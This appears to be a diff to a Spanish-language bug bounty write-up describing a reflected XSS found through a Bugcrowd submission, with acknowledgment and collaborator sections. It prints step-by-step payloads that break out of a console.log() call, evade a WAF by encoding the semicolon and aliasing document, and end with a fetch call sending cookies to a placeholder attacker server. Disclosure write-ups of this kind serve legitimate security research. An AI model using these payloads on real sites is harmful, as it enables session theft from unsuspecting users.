@@ -29,51 +29,60 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
     <p>Decidimos inspeccionar cuidadosamente el código fuente del sitio web y nos dimos cuenta de que nuestra entrada estaba dentro de una función <code>console.log()</code>.</p>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/f4adceabac940d2709d032787a93236f.png" alt="Resultado de Búsqueda Normal">
 
+    <hr>
     <h2>🛡️ Etiqueta &lt;script&gt; deshabilitada</h2>
     <p>Realizamos algunas pruebas básicas que se llevan a cabo para intentar detectar ataques XSS:</p>
     <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
     <p>Todo lo que obtuvimos fue que el Firewall de Aplicaciones Web (WAF) rechazó nuestras solicitudes ante el más mínimo signo de actividad maliciosa.</p>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/546b2f225d101e29c3a618b41645a151.png" alt="Bloqueado por el WAF">
 
+    <hr>
     <h2>🔧 Cerrar la cadena de console.log de Javascript</h2>
     <p>Basándonos en nuestro descubrimiento inicial, decidimos intentar cerrar <code>console.log()</code> para insertar código justo después de él utilizando el siguiente payload:</p>
     <pre><code>pwn');</code></pre>
     <p>Insertamos <code>')</code> inmediatamente después de una cadena de texto, que es lo que JavaScript necesitaba para cerrar <code>console.log()</code>. Sin embargo, el símbolo de punto y coma <code>;</code> no se mostraba.</p>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/981af669ba5656927efdac5a9a8a30d5.png" alt="Cerrando console.log">
 
+    <hr>
     <h2>&#x1F9E9; Anexar Javascript (No funciona)</h2>
     <pre><code>pwn');alert(1)</code></pre>
     <p>Lo intentamos de nuevo, pero con texto después del punto y coma. Tras varias pruebas, no conseguimos que el punto y coma apareciera. Peor aún, todo lo que venía después del punto y coma ni siquiera se reflejaba.</p>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/3fe13a271aa6a7120aa40703c0933005.png" alt="¿Dónde está el punto y coma?">
 
+    <hr>
     <h2>&#x1F9F1; Anexar Javascript (Bypass)</h2>
     <p>Para que funcionara y empezar a inyectar código, tuvimos que codificar el punto y coma en formato HTML, cambiándolo de <code>;</code> a <code>%3b</code>.</p>
     <pre><code>pwn')%3balert(1)</code></pre>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/8c14339a9b0347ef35e6369350a6964b.png" alt="Bypass del Punto y Coma">
 
+    <hr>
     <h2>💥 Primera Alerta (Funcionando)</h2>
     <p>Aunque el WAF no aceptaba la etiqueta <code>&lt;script&gt;</code>, logramos que renderizara la etiqueta <code>&lt;/script&gt;</code>, lo cual fue suficiente para llevar a cabo un ataque XSS REFLEJADO.</p>
     <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/077c7c91a0c356a8223587714c9805ac.png" alt="Alert 1">
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/8eaccafb86685327e7c52132978cb579.png" alt="Alert 1 HTML">
 
+    <hr>
     <h2>&#x1F6AB; Segunda Alerta (El Firewall bloquea)</h2>
     <p>Una vez logramos ejecutar un <code>alert()</code> en la web, quisimos ir más allá e intentar leer las cookies del usuario. El WAF continuó rechazando las solicitudes en cuanto detectaba cadenas sospechosas como <code>document.cookie</code>.</p>
     <pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/546b2f225d101e29c3a618b41645a151.png" alt="Bloqueado por el WAF">
 
+    <hr>
     <h2>&#x1F575;&#xFE0F; Bypass del Firewall para Cookies</h2>
     <p>El WAF rechazaba cadenas como <code>document.cookie</code>. Para lograr un bypass efectivo del WAF, creamos una variable <code>a</code> que contenía <code>document</code>, y solicitamos <code>cookie</code> desde esa variable.</p>
     <pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/fece825e7c28a4322c047f5534284e90.png" alt="Alerta de Document Cookie">
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/444b81920a1d001cbad4f1bdd1bf4e11.png" alt="Resultado de Document Cookie">
 
+    <hr>
     <h2>🚀 Exploit Final (Exfiltración de Cookies)</h2>
     <p>En lugar de ejecutar <code>alert</code>, ejecutamos <code>fetch</code> para enviar una solicitud a un servidor controlado por el atacante.</p>
     <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/4dbf4c3c830303dce1488a8522b68935.png" alt="Exploit Final">
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/85f2210c208a80164de2adf36e1cc284.png" alt="Petición de Exfiltración">
 
+    <hr>
     <h2>📜 Reconocimiento Oficial</h2>
     <div class="pdf-container">
       <iframe src="/assets/others/4b01725e-288b-4db5-a38c-1a37f827d215/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
@@ -83,6 +92,7 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
       <a href="/assets/others/4b01725e-288b-4db5-a38c-1a37f827d215/acknowledgment.pdf" class="lang-btn" target="_blank">📥 Descargar Carta Oficial (PDF)</a>
     </div>
 
+    <hr>
     <h2>🤝 Detalle de Colaboración</h2>
     <p>Esta investigación fue realizada en un esfuerzo conjunto con los siguientes investigadores:</p>
     <div class="collab-grid">
